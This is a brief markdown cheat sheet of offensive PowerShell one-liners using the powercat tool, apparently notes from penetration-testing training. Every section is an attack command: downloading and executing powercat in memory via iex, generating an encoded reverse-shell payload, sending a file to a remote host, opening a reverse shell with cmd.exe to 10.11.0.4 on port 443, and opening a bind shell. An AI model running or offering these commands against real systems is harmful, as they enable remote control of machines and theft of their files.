#windows #reverseShells 


#### Powercat encrypted payloads

```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```




#### Download and Load Powercat

```Powershell
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```


#### file Transfer

```powershell
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1 ## sends the file powercat,ps1
```


#### Reverse Shell

```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```


#### Bind Shell

```powershell
powercat -l -p 443 -e cmd.exe
```
